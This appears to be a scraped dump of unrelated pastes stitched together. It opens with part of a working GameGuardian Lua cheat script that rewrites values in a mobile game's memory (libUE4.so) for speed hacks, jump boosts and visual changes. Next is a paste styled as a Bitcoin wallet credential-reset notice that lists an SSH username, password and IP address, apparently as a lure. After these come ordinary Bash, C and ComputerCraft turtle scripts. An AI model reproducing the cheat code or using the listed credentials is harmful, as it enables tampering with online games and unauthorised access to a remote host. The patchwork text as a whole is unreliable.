_ENV[""gg""][""searchNumber""]((""4525216907414147695""), _ENV[""gg""][""TYPE_QWORD""], false, _ENV[""gg""][""SIGN_EQUAL""], 0, -1, 0)
_ENV[""gg""][""getResults""](2001)
_ENV[""gg""][""editAll""]((""4525216907469311181""), _ENV[""gg""][""TYPE_QWORD""])
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""setRanges""](_ENV[""gg""][""REGION_CODE_APP""])
_ENV[""gg""][""searchNumber""]((""-1505254313802431360""), _ENV[""gg""][""TYPE_QWORD""], false, _ENV[""gg""][""SIGN_EQUAL""], 0, -1, 0)
_ENV[""gg""][""getResults""](2001)
_ENV[""gg""][""editAll""]((""-1505254313803907072""), _ENV[""gg""][""TYPE_QWORD""])
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""setRanges""](_ENV[""gg""][""REGION_CODE_APP""])
_ENV[""gg""][""searchNumber""]((""-1328550391548856387""), _ENV[""gg""][""TYPE_QWORD""], false, _ENV[""gg""][""SIGN_EQUAL""], 0, -1, 0)
_ENV[""gg""][""getResults""](2001)
_ENV[""gg""][""editAll""]((""-1328550391397430067""), _ENV[""gg""][""TYPE_QWORD""])
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""toast""]((""Micro Speed""))
fspeed2 = on
else
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""setVisible""](false)
_ENV[""gg""][""setRanges""](_ENV[""gg""][""REGION_ANONYMOUS""])
_ENV[""gg""][""searchNumber""]((""4525216907469311181""), _ENV[""gg""][""TYPE_QWORD""], false, _ENV[""gg""][""SIGN_EQUAL""], 0, -1, 0)
_ENV[""gg""][""getResults""](2001)
_ENV[""gg""][""editAll""]((""4525216907414147695""), _ENV[""gg""][""TYPE_QWORD""])
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""setRanges""](_ENV[""gg""][""REGION_CODE_APP""])
_ENV[""gg""][""searchNumber""]((""-1505254313803907072""), _ENV[""gg""][""TYPE_QWORD""], false, _ENV[""gg""][""SIGN_EQUAL""], 0, -1, 0)
_ENV[""gg""][""getResults""](2001)
_ENV[""gg""][""editAll""]((""-1505254313802431360""), _ENV[""gg""][""TYPE_QWORD""])
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""setRanges""](_ENV[""gg""][""REGION_CODE_APP""])
_ENV[""gg""][""searchNumber""]((""-1328550391397430067""), _ENV[""gg""][""TYPE_QWORD""], false, _ENV[""gg""][""SIGN_EQUAL""], 0, -1, 0)
_ENV[""gg""][""getResults""](2001)
_ENV[""gg""][""editAll""]((""-1328550391548856387""), _ENV[""gg""][""TYPE_QWORD""])
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""toast""]((""Micro Speed off""))
fspeed2 = off
end
end

function BD6()
if fspeed3 == off then
Name = ("""") 
local Nc = 16392 
local Lx = 32 
local Sz1 = {{-1296744149883614555, 0}} 
local Sz2 = {{-1296744153870237696, 0}} 
MasterAhsanYT(Nc, Lx, Sz1, Sz2) 
Name = ("""") 
local Nc = 16392 
local Lx = 32 
local Sz1 = {{-1505254313802431360, 0}} 
local Sz2 = {{-1505254313804169216, 0}} 
MasterAhsanYT(Nc, Lx, Sz1, Sz2) 
_ENV[""gg""][""toast""](("" On""))
fspeed3 = on
else
Name = ("""") 
local Nc = 16392 
local Lx = 32 
local Sz1 = {{-1296744153870237696, 0}} 
local Sz2 = {{-1296744149883614555, 0}} 
MasterAhsanYT(Nc, Lx, Sz1, Sz2) 
Name = ("""") 
local Nc = 16392 
local Lx = 32 
local Sz1 = {{-1505254313804169216, 0}} 
local Sz2 = {{-1505254313802431360, 0}} 
MasterAhsanYT(Nc, Lx, Sz1, Sz2) 
_ENV[""gg""][""toast""](("" Off""))
fspeed3= off
end
end

function BD7()
Name = (""Master"") 
local Nc = 32
local Lx = 16
local Sz1 = {{1400.0, 0},{88.0, 20},{60.0, 24},{50.0, 28},{2.0, 32}}
local Sz2 = {{-48, 24}}
MasterAhsanYT(Nc, Lx, Sz1, Sz2)
_ENV[""gg""][""toast""]((""fix stuck""))
end

function BD8()
if cjump == off then
_ENV[""gg""][""setRanges""](_ENV[""gg""][""REGION_ANONYMOUS""])
_ENV[""gg""][""searchNumber""]((""-980""), 16)
_ENV[""gg""][""getResults""](500)
_ENV[""gg""][""editAll""]((""707.7""), _ENV[""gg""][""TYPE_FLOAT""])
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""toast""](("" On""))
cjump = on
else
_ENV[""gg""][""setRanges""](_ENV[""gg""][""REGION_ANONYMOUS""])
_ENV[""gg""][""searchNumber""]((""707.7""), 16)
_ENV[""gg""][""getResults""](500)
_ENV[""gg""][""editAll""]((""-980""), _ENV[""gg""][""TYPE_FLOAT""])
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""toast""](("" Off""))
cjump= off
end
end

function B5()
eee = _ENV[""gg""][""multiChoice""]({
(""🌚 ʙʟᴀᴄᴋ ʙᴏᴅʏ 🌚""..'\n'..""""),--1
(""📱 ɪᴘᴀᴅ ᴠɪᴇᴡ 📱""..'\n'..""""),--2
(""🌉 ʙʟᴀᴄᴋ sᴋʏ 🌆""..'\n'..""""),--3
(""🪐 ɴᴏ ᴛʀᴇᴇ ᴅᴇsᴇʀᴛ ᴍᴀᴘ 🪐""..'\n'..""""),--4
(""🏜️ ɴᴏ ɢʀᴀss 🏜️""..'\n'..""""),--5
(""🟦 ᴄʏᴀɴ ᴛʜᴇᴍᴇ🟦""..'\n'..""""),--6
(""♓ ᴘᴜʀᴘʟᴇ ᴛʜᴇᴍᴇ♓""..'\n'..""""),--7
(""🎆 ɴɪɢʜᴛ ᴍᴏᴅ🎆""..'\n'..""""),--8
(""♓ ᴘɪɴᴋ ᴍᴀᴘ♓""..'\n'..""""),--9
(""🔵 ɴᴀᴠʏ ʙʟᴜᴇɴ ғᴏɢ🔵""..'\n'..""""),--10
(""🟢 ɢʀᴇᴇɴ ғᴏɢ🟢""..'\n'..""""),--11
(""😈 ᴘᴜʀᴘʟᴇ ғᴏɢ😈""..'\n'..""""),--12
(""🟢 ᴏʟɪᴠᴇ ғᴏɢ🟢""..'\n'..""""),--13
(""🟢 ʟɪᴍᴀ ғᴏɢ🟢""..'\n'..""""),--14
(""🔴ʀᴇᴅ ғᴏɢ🔴""..'\n'..""""),--15
(""🟢 ᴠɪᴏʟᴇᴛ ғᴏɢ🟢""..'\n'..""""),--16
(""♈ʀᴇᴅ ғᴏɢ 2♈""..'\n'..""""),--17
(""⚪ ɴᴏ ғᴏɢ⚪""..'\n'..""""),--18
(""🏠༼ʜᴏᴍᴇ༽🏠"")
}, nil, ("" Cʀᴇᴀᴛᴏʀ @VN_IRAQ_ANDRID_OFFICIAL ""))

if eee == nil then else
if eee[1]== true then BE1() end
if eee[2]== true then BE2() end
if eee[3]== true then BE3() end
if eee[4]== true then BE4() end
if eee[5]== true then BE5() end
if eee[6]== true then BE6() end
if eee[7]== true then BE7() end
if eee[8]== true then BE8() end
if eee[9]== true then BE9() end
if eee[10]== true then BE10() end
if eee[11]== true then BE11() end
if eee[12]== true then BE12() end
if eee[13]== true then BE13() end
if eee[14]== true then BE14() end
if eee[15]== true then BE15() end
if eee[16]== true then BE16() end
if eee[17]== true then BE17() end
if eee[18]== true then BE18() end
if eee[19]== true then HOME() end
end
PUBGMH = -1
end

function BE1()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x206E528          
setvalue(so+py,16,14)
_ENV[""gg""][""toast""]((""ʙʟᴀᴄᴋ ʙᴏᴅʏ ""))
end

function BE2()
so = _ENV[""gg""][""getRangesList""]((""libUE4.so""))[1].start 
setvalue(so+(""0x26C7BEC""),16,110)
_ENV[""gg""][""toast""]((""ɪᴘᴀᴅ ᴠɪᴇᴡ ""))
end

function BE3()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x2907C20          
setvalue(so+py,16, (""hB4 C6 27 B7""))
_ENV[""gg""][""toast""]((""ʙʟᴀᴄᴋ sᴋʏ ᴏɴ ""))
end

function BE4()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x2797E2C          
setvalue(so+py,4,0)
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x2185810          
setvalue(so+py,4,0)
_ENV[""gg""][""toast""]((""ᴅᴇsᴇʀᴛ ᴍᴀᴘ ᴏɴ ""))
end

function BE5()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x2797E2C          
setvalue(so+py,4,0)
_ENV[""gg""][""toast""]((""ɴᴏ ɢʀᴀss ᴏɴ ""))
end

function BE6()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x194AB10          
setvalue(so+py,4,0)
_ENV[""gg""][""toast""]((""ᴄʏᴀɴ ᴛʜᴇᴍᴇ""))
end


function BE7()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x194AB0C          
setvalue(so+py,4,0)
_ENV[""gg""][""toast""]((""ᴘᴜʀᴘʟᴇ ᴛʜᴇᴍᴇ""))
end

function BE8()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x20A0860          
setvalue(so+py,4,0)
_ENV[""gg""][""toast""]((""ɴɪɢʜᴛ ᴍᴏᴅ""))
end

function BE9()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x20D4FC0          
setvalue(so+py,4,0)
_ENV[""gg""][""toast""]((""ᴘɪɴᴋ ᴍᴀᴘ""))
end

function BE10()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x208C934          
setvalue(so+py,4,0)
_ENV[""gg""][""toast""]((""ɴᴀᴠʏ ʙʟᴜᴇɴ ғᴏɢ""))
end

function BE11()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x208C940          
setvalue(so+py,4,0)
_ENV[""gg""][""toast""]((""ɢʀᴇᴇɴ ғᴏɢ""))
end

function BE12()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x208C938          
setvalue(so+py,4,0)
_ENV[""gg""][""toast""]((""ᴘᴜʀᴘʟᴇ ғᴏɢ""))
end

function BE13()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x208C93C          
setvalue(so+py,4,0)
_ENV[""gg""][""toast""]((""ᴏʟɪᴠᴇ ғᴏɢ""))
end

function BE14()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x208C944          
setvalue(so+py,4,0)
_ENV[""gg""][""toast""]((""ʟɪᴍᴀ ғᴏɢ""))
end

function BE15()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x208C934          
setvalue(so+py,4,0)
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x208C940          
setvalue(so+py,4,0)
_ENV[""gg""][""toast""]((""ʀᴇᴅ ғᴏɢ""))
end

function BE16()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x208C934          
setvalue(so+py,4,0)
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x208C938          
setvalue(so+py,4,0)
_ENV[""gg""][""toast""]((""ᴠɪᴏʟᴇᴛ ғᴏɢ""))
end

function BE17()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x208C940          
setvalue(so+py,4,0)
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py"
SnykJjuw,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Tuesday 5th of December 2023 05:23:16 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be 
chefman440:Jmh3x9ZB on 149.28.231.183
You can connect via SSH.

Regards,
GM-403930"
Sz8SikCh,scsdcsd,J3st3rs_j0k3,Bash,Tuesday 5th of December 2023 05:22:53 AM CDT,"#!/bin/bash

# Function to display usage
display_usage() {
    echo ""Использование: $0 directory1 directory2""
    echo ""Сравнить содержимое двух каталогов""
}

# Check if help option is specified
if [[ ( $1 == ""--help"") ||  $1 == ""-h"" ]]; then
    display_usage
    exit 0
fi

# Check if number of arguments is correct
if [ ""$#"" -lt 2 ]; then
    echo ""Ошибка: Неправильное количество аргументов""
    display_usage
    exit 1
fi

dir1=$1
dir2=$2

# Compare the contents of the two directories
for file in $(ls $dir1); do
    if [ -e ""$dir2/$file"" ]; then
        # Файл есть в двух папках, сравнивать по размеру и времени изменения
        size1=$(stat -c %s ""$dir1/$file"")
        size2=$(stat -c %s ""$dir2/$file"")
        time1=$(stat -c %Y ""$dir1/$file"")
        time2=$(stat -c %Y ""$dir2/$file"")

        if [ $size1 -eq $size2 ] && [ $time1 -eq $time2 ]; then
            echo ""Файл $file одинаков в двух каталогах""
        else
            echo -e ""Файл $file отличается в двух каталогах.\nФайл $file имеет размер $size1 [bytes] и время $time1 в первой папке\nНо $file имеет размер $size2 [bytes] и время $time2 во второй папке""
        fi
    else
        echo ""Файл $file есть только в $dir1""
    fi
done

# Check for files present only in dir2
for file in $(ls $dir2); do
    if [ ! -e ""$dir1/$file"" ]; then
        echo ""Файл $file есть только в $dir2""
    fi
done
"
BhEKfyAV,Stack,Dimaland,C,Tuesday 5th of December 2023 05:15:11 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

// Структура узла стека
struct Node {
    int data;
    struct Node* next;
};

// Функция для создания нового узла
struct Node* newNode(int data) {
    struct Node* node = (struct Node*)malloc(sizeof(struct Node));
    node->data = data;
    node->next = NULL;
    return node;
}

// Функция для добавления элемента в стек
void push(struct Node** root, int data) {
    struct Node* node = newNode(data);
    node->next = *root;
    *root = node;
    printf(""%d добавлено в стек.\n"", data);
}

// Функция для удаления всех четных чисел из стека
void removeEvenNumbers(struct Node** root) {
    struct Node* current = *root;
    struct Node* prev = NULL;

    while (current != NULL) {
        if (current->data % 2 == 0) {
            if (prev == NULL) {
                *root = current->next;
                free(current);
                current = *root;
            } else {
                prev->next = current->next;
                free(current);
                current = prev->next;
            }
        } else {
            prev = current;
            current = current->next;
        }
    }
}

// Функция для вывода содержимого стека
void printStack(struct Node* root) {
    if (root == NULL) {
        printf(""Стек пуст.\n"");
        return;
    }
    printf(""Содержимое стека: "");
    while (root != NULL) {
        printf(""%d "", root->data);
        root = root->next;
    }
    printf(""\n"");
}

int main() {
    SetConsoleOutputCP(CP_UTF8);

    struct Node* stack = NULL;

    push(&stack, 1);
    push(&stack, 2);
    push(&stack, 3);
    push(&stack, 4);
    push(&stack, 5);

    printf(""Исходное "");
    printStack(stack);

    removeEvenNumbers(&stack);

    printf(""Стек после удаления четных чисел: "");
    printStack(stack);

    return 0;
}
"
Q3ttuX77,Задача про 3 цвета(о голландском флаге),anticlown,C,Tuesday 5th of December 2023 04:35:02 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <locale.h>
#include <malloc.h>
#include <stdbool.h>

void swap(int* a, int* b);
enum colors { eRed = 0, eWhite = 1, eBlue = 2 };
char* colorNames[] = {
    ""Кр"",
    ""Бел"",
    ""Син"",
};

/*  task methods start  */
void dutchFlagSort(enum colors inpArr[], int arrSize)
{
    int low = 0;
    int high = arrSize - 1;
    int middle = 0;
    while (middle <= high) {
        switch (inpArr[middle]) {
            case 0:
                swap(&inpArr[low++], &inpArr[middle++]);
                break;
            case 1:
                middle++;
                break;
            case 2:
                swap(&inpArr[middle], &inpArr[high--]);
                break;
        }
    }
}

void swap(int* a, int* b)
{
    int temp = *a;
    *a = *b;
    *b = temp;
}
/*  task methods end  */

/*      print procs start      */
void printTaskInfo() {
    printf(""\tДанная программа решает следующую задачу:\n"");
    printf(""В каждой лунке лежит красный, белый или синий шар. Одним ходом разрешается менять местами два любых шара.\nДобиться того, чтобы все красные шары шли первыми, все синие - последними, а белые - посередине.\n"");
}

void printArray(int arr[], int arr_size)
{
    for (int i = 0; i < arr_size; i++)
        printf(""%s "", colorNames[arr[i]]);
}
/*      print procs end      */

int main()
{
    setlocale(LC_ALL, ""Rus"");
    printTaskInfo();

    enum colors inputArr[] = { eRed, eBlue, eWhite, eRed, eWhite, eBlue,eRed,eRed, eBlue, eBlue, eWhite, eWhite, eBlue };
    int arrSize = sizeof(inputArr) / sizeof(inputArr[0]);

    printf(""\nРасположение шаров до сортировки:\n"");
    printArray(inputArr, arrSize);
    dutchFlagSort(inputArr, arrSize);
    printf(""\n\nРасположение шаров после сортировки:\n"");
    printArray(inputArr, arrSize);

    getch();
    return 0;
}"
4smiMYjH,StarlightDisk,Phemto,Lua,Tuesday 5th of December 2023 04:17:04 AM CDT,"--Create a circular platform

--declare global variables that are relevant to platform
R_hole = 50 --outer radius of the platform
numStripes = 16 --number of stripes as it goes out. 
swirlFactor = 1 --control degree of swirl


--declare the global variables
theta = 0 --sweep of the spiral
step = 0.001 --change in theta each step
b = 0.14   --growth factor for spiral
theta = theta / b
--Now get the turtle identifier 
R_max = 15 --Outermost radius of the tower 
R_base = 6 --The radius at the base. Also the radius of the stairs all the way up. 
R_decay = 5000 --Half-life of the tower width
Floor_Spacing = 6 --put a floor in every this many blocks
lavaSum = 200		--sum of the YY locations for finding lava
lavaCount = 0  --number of lava blocks collected
cobbleCountMax = 1600  --give up if you check this many columns and they're all already done
firstEmptyChest = 1
Chest_Level = 5 --elevation of the chests  
top_column_height = 12 --don't start pinching in the radius until this far
killMode = 0  --set to 1 to hunt and capture other turtles. 
fuelStop = 0 --stop when the tank is full

if term.isColor() then 
	maxFuel = 99000 --this is an advanced turtle
else 
	maxFuel = 19000 --this is a normal turtle
end
StartX = 0
StartY = 20  
StartZ = 14

curX = 0 	--current X position relative to the start
curY = 0	--current Y position relative to the start
curZ = 0	--current Z position relative to the start
facing = 0	--what direction is the turtle facing (0,1,2,3)
			--0 is toward positive Z
waterLevel = -1000 --the highest location that water has been found


function fuel(direction)
		--called periodically, and also when lava is detected. 
		turtle.select(1)
		--Now let's pickup the lava 
		if string.find(direction, ""f"") then
			--its in front
			turtle.place()
		elseif string.find(direction, ""d"") then
			turtle.placeDown()
			lavaSum = lavaSum + curY
			lavaCount = lavaCount + 1
		elseif string.find(direction, ""u"") then
			turtle.placeUp()
			lavaSum = lavaSum + curY
			lavaCount = lavaCount + 1
		end
		if turtle.getFuelLevel() < maxFuel then
				for slot = 4,16,1 do
					turtle.select(slot)
					turtle.refuel()
					if turtle.compareTo(1) then
						turtle.transferTo(1)
					end
					if turtle.getFuelLevel() > maxFuel then
						break
					end
				end
			if curY >=0 and turtle.getFuelLevel() < 1000 then
				local oldY = curY
				for i=1,4,1 do
					if not turtle.detectUp() then Up() end
				end
				repeat 
					--Time to refuel
					for slot = 4,16,1 do
						turtle.select(slot)
						turtle.refuel()
						if turtle.compareTo(1) then
							turtle.transferTo(1)
						end
					end
				until (turtle.getFuelLevel() > 1000)   --don't stop trying if the level is too low
			end
		else
			--fuel has been called, but the tank is full 
			if turtle.getItemCount(1) == 1 or turtle.getItemCount(16) > 0 then
				--We're either out of buckets or out of space
				dumpLava()
			end
		end
		turtle.select(1)
	    report(""refueled"")
end

function dumpLava()
	--return to the repository to get rid of excess lava
	local XX = curX
	local YY = curY
	local ZZ = curZ
	oldfacing = facing

	MoveTo(curX,1+turtID,curZ)
	MoveTo(0,1+turtID,0)
	lavaFuel()
	MoveTo(0,1+turtID,0)
	MoveTo(XX,1+turtID,ZZ)
	MoveTo(XX,-2,ZZ)
	setCobble(""u"")
	MoveTo(XX,YY,ZZ)
	TurnTo(oldfacing)
end


function lavaFuel()
		--refuel from onboard lava buckets. 
		--if fuel is full, then dump excess in lava repository below (0,0,0)
		if turtle.getFuelLevel() < maxFuel then
				for slot = 4,16,1 do
					turtle.select(slot)
					turtle.refuel()
					if turtle.compareTo(1) then
						turtle.transferTo(1)
					end
					if turtle.getFuelLevel() > maxFuel then
						break
					end
				end
		end
		lava = 0 
		for slot = 4,16,1 do
			local data = turtle.getItemDetail(slot)
			if data and string.find(data.name,""lava"") then 
				lava = lava + 1
			end
		end
		while lava > 0 or turtle.getFuelLevel() < 2000 do
			--either we have excess fuel or level is too low. 
			--time to go to the repository
			print(""Going to repository I have "", lava , ""buckets."")
			MoveTo(curX,turtID+1,curZ)
			MoveTo(0,turtID+1,0)
			MoveTo(0,0,0)
			local success, data = turtle.inspectDown()
			local success_f, data_f = turtle.inspect()
			if success and string.find(data.name,""trap"") then
				os.exit()
			end
			while not success or 
					  not ( 	(success and string.find(data.name,""bedrock"") )
							or 
								(success and string.find(data.name, ""lava"") and data.state.level == 0 )
							or
								(success_f and string.find(data_f.name, ""lava"") and data.state.level == 0 )
							or
								(success and string.find(data.name, ""trapdoor"") )
					  	  ) do
				Down()
				if (success and string.find(data.name, ""trapdoor"") ) then
					while (success and string.find(data.name, ""trapdoor"")) do
						sleep(120)
						success, data = turtle.inspectDown()
					end
				end
				success, data = turtle.inspectDown()
			end
			--We're now either over lava or over bedrock
			print(""At lava level"")
			if turtle.getFuelLevel() < 2000 then 
				--we're here to pick up lava
				done = 0
				while done==0 do
					for i=0,3,1 do
						fuel(""f"")
						TRight()
					end
					fuel(""d"")
					Down()
					if turtle.getFuelLevel() > 15000 or turtle.detectDown() then
						done = 1
					end
				end
			else 
				--we're here to deposit
				print(""Depositing"")
				local done = 0
				local dir = 0
				while done == 0 do 
					done = 1
					for s = 4,16,1 do 
						data = turtle.getItemDetail(s)
						if data and string.find(data.name,""lava"") then 
							turtle.select(s)
							if dir < 4 then 
								TurnTo(dir)
								if turtle.place() then
									turtle.transferTo(1)
								end
							else
								--we've already gone in all directions.
								Up()
								if turtle.placeDown() then 
									turtle.transferTo(1)
								end
								dir = -1
							end
							done = 0
							dir = dir + 1
						end
					end
				end
			end
			if curY > -4 then
				--we've filled the repository 
				MoveTo(0,1+turtID,1)
				os.exit()
			end
			MoveTo(0,1+turtID,0)
			if turtle.getFuelLevel() < 2000 then
				MoveTo(0,turtID+1,1)   --park position
				sleep(120)
				fuel(""n"")				
			end
			MoveTo(0,1+turtID,0)
			lava = 0 
			for slot = 4,16,1 do
				local data = turtle.getItemDetail(slot)
				if data and string.find(data.name,""lava"") then 
					lava = lava + 1
				end
			end	
		end
end

function Init() 
	--called when I want the turtle to set up the chests for me 
	turtle.select(4) -- slot to put a stack of chests
	local row = 0
	while turtle.getItemCount(4) > 0 or turtle.getItemCount(5) > 0 do
		MoveTo(row,5,1)
		TurnTo(0)
		for x=1,10,1 do
			turtle.placeUp()
			if turtle.getItemCount(4) == 0 then 
				turtle.select(5)
			end
			Forward()
		end
		row = row+1
	end
	MoveTo(0,0,0)
end
	

function SlotItems(slot)
	turtle.select(slot)
	if turtle.getItemCount() == 0 then
		return ""nothing""
	else 
		local data =  turtle.getItemDetail()
		return data.name
	end
end		

function TRight()
    --Turn the turtle to the right
    turtle.turnRight()
    facing = facing +1
    if facing > 3 then
        facing = facing - 4
    end
end

function TLeft()
    --Turn the turtle to the right
    turtle.turnLeft()
    facing = facing - 1
    if facing < 0 then
        facing = facing + 4
    end
end
 
function Forward()
	 local success, data = turtle.inspect()
     if success then
		local count = 0
		if string.find(data.name, ""urtle"") and killMode == 0 then 
			local p=0
        	while success do
 	 			if not p then 
					print(""Turtle detected: Can't move forward!"")
					p=1
				end
				sleep(math.random(100)/10)
				count = count + 1
				if count > 4 and count % 10 == 7 then
					if not turtle.detectUp() then
						Up()
						sleep(20)
						Down()
					elseif not turtle.detectDown() then
						Down()
						sleep(20)
						Up()
					end
				end
				success, data = turtle.inspect()
				if count > 2000 then 
					--we've waited long enough the turtle must be stuck capture it and return home
					for s = 2,16,1 do
						turtle.select(s)
						turtle.drop()
					end
					turtle.dig()
				end
			end
		end
		if success and string.find(data.name, ""lava"") then
				fuel(""f"")
		end
	end
	while not turtle.forward() do
		        	turtle.dig()
	end
    if facing == 0 then
		curZ = curZ + 1
	elseif facing == 1 then
		curX = curX +1
	elseif facing == 2 then
		curZ = curZ - 1
	else
		curX = curX - 1
	end
end
 
function Up()
	local success, data = turtle.inspectUp()
     if success then
		local count = 0
		if string.find(data.name, ""urtle"") and killMode == 0 then
			local p = 0
    	    while success do
 		 		if not p then 
					print(""Turtle detected: Can't move up!"")
					p=1
				end
				sleep(math.random(10))
				success, data = turtle.inspectUp()
				count = count +1
				if count > 3 and count % 10 == 4 then
					local olddir = facing
					while turtle.detect() do
						TRight()
					end
					Forward()
					sleep(20)
					TRight()
					TRight()
					Forward()
					TurnTo(olddir)
				end
			end
		end
		if success and string.find(data.name, ""lava"") and data.state.level ==0 then
				fuel(""u"")
		end
	end
    while not turtle.up() do
        turtle.digUp()
    end
	curY = curY + 1
end
 
function Down()
		local success, data = turtle.inspectDown()
        if success then
			--print(data.name)
			local count = 0
			if (string.find(data.name,""brick"") or 
				string.find(data.name,""end"") ) then 
					return 0
			end
			if string.find(data.name, ""urtle"") and killMode == 0 then
				local p = 0
				while success do
 					if not p then 
						print(""Turtle detected: Can't move down"")
						p=1
					end
					sleep(math.random(10))
					success, data = turtle.inspectDown()
					count = count +1
					if count > 3 and count % 10 == 4 then
						local olddir = facing
						while turtle.detect() do
							TRight()
						end
						Forward()
						sleep(20)
						TRight()
						TRight()
						Forward()
						TurnTo(olddir)
					end
					if count > 2000 then
						turtle.digDown()  --the turtle is not getting out of the way. Eat it. 
					end
				end
			end
		end
		if success and string.find(data.name, ""lava"") and data.state.level == 0 then
			fuel(""d"")
		end
		if success and (string.find(data.name, ""bedrock"") or 
						string.find(data.name, ""spawner"") or
						string.find(data.name, ""torch"")  ) then
			--we've hit bedrock. We can't go further. 
			--print(""hit something we can dig. Returning 0"")
			return 0
		end
    while not turtle.down() do
        turtle.digDown()
    end
	curY = curY - 1
	return 1
end

function TurnTo(face)
	if (face - facing) % 4 == 3 then 
		while (facing ~= face) do
			TLeft()
		end
	else
		while (facing ~= face) do
			TRight()
		end
	end		
end

function MoveTo (MoveToX, MoveToY, MoveToZ) 
	--Move the turtle to the desired position
	--first X
	--print(MoveToX, "" "" , MoveToY, "" "" ,MoveToZ)
	if MoveToX < curX then 
		TurnTo(3)
		while MoveToX < curX do
			Forward()
		end
	elseif MoveToX > curX then
		TurnTo(1) 
		while MoveToX > curX do
			Forward()
		end
	end 
	--Now Z
	if MoveToZ < curZ then 
		TurnTo(2)
		while MoveToZ < curZ do
			Forward()
		end
	elseif MoveToZ > curZ then
		TurnTo(0) 
		while MoveToZ > curZ do
			Forward()
		end
	end 
	--Now Y
	if MoveToY < curY then
		while MoveToY < curY do 
			Down()
		end
	end
	while MoveToY > curY do
		Up()
	end
end --MoveTo

function cobbleBelow()
	local success, data = turtle.inspectDown()
	if success then 
 		if string.find(data.name, ""cobble"") or string.find(data.name, ""urtle"") then
			return 1
		end
	end
	return nil
end

function setCobble(direction)
	for i=1,2,1 do 
		for slot = 2,3,1 do
			turtle.select(slot)
			if turtle.getItemCount() > 1 then
				if string.find(direction, ""d"") then
					turtle.placeDown()
				elseif string.find(direction, ""u"") then
					turtle.placeUp()
				else 
					--forward
					turtle.place()
				end
				if turtle.getItemCount() < 10 then 
					for s=5,16,1 do
						turtle.select(s)
						if turtle.compareTo(slot) then
							turtle.transferTo(slot)
							return(1)
						end
					end
				end
				return(1)
			end
		end
		replenishCobble()
	end
	moveTo(0,1+turtID,1)
	print(""ran out of cobblestone"")
	os.exit()
end

function replenishCobble()
	--return to the chests and load up on cobble.
	local XX = curX
	local YY = curY
	local ZZ = curZ
	oldfacing = facing

	MoveTo(curX,1+turtID,curZ)
	MoveTo(turtID,1+turtID,1)
	MoveTo(turtID,5,1)
	fuel(""n"")
	local chestNum = 11
	local needMore = 1
	while chestNum > 0 do
		chestNum = chestNum - 1
		MoveTo(2*math.floor(chestNum/10) +turtID ,curY, chestNum % 10 + 1)
		needMore = 0
		for slot = 2,4,1 do
			turtle.select(slot)
			turtle.suckUp()	
			if turtle.getItemCount() < 64 then 
				needMore = 1
			end
		end
	end
	if turtle.getItemCount(3) < 64 then
		print(""I need more cobble."")
		MoveTo(curX,turtID+1,curZ)
		turtle.select(3)
		while turtle.getItemCount() < 64 do
			sleep(10)
		end
		fuel(""n"")
	end
	MoveTo(XX,1+turtID,ZZ)
	MoveTo(XX,-2,ZZ)
	setCobble(""u"")
	MoveTo(XX,YY,ZZ)
	TurnTo(oldfacing)
end

function facingOut()
	--determine if the turtle is facing toward the center or outward
	--return true if outward 
	print( curX, "","", curY, "","" ,curZ) 
	if curX > 0 then
		if curZ > 0 then
			if facing == 0 or facing == 1 then 
			
				return true
			else
				return false
			end
		elseif curZ < 0 then 
			if facing == 1 or facing == 2 then 
				return true
			else
				return false
			end
		else
			--Z is 0
			if facing == 0 or facing == 1 or facing == 2 then
				return true
			else	
				return false
			end
		end
	elseif curX < 0 then
		if curZ > 0 then
			if facing == 0 or facing ==3 then 
				return true
			else
				return false
			end
		elseif curZ < 0 then 
			if facing == 2 or facing == 3 then 
				return true
			else
				return false
			end
		else
			--Z is 0
			if facing == 0 or facing == 3 or facing == 2 then
				return true
			else	
				return false
			end
		end
	else
		--x is zero
		if curZ > 0 then
			if facing == 0 or facing == 3 or facing == 1 then
				return true
			else	
				return false
			end
		elseif curZ < 0 then
			if facing == 2 or facing == 3 or facing == 1 then
				return true
			else	
				return false
			end
		else
			--we are at 0,0
			return true
		end
	end
end

function Outward()
	--determine the directions that are outward 
	local directions = {}

	if math.abs(curX) >= math.abs(curZ)-1 then
		if curX >= 0 then 
			table.insert(directions, 1)
		end
		if curX <= 0 then 
			table.insert(directions, 3)
		end
	end
	if math.abs(curZ) >= math.abs(curX)-1 then
		if curZ >= 0 then 
			table.insert(directions, 0)
		end
		if curZ <= 0 then 
			table.insert(directions, 2)
		end
	end
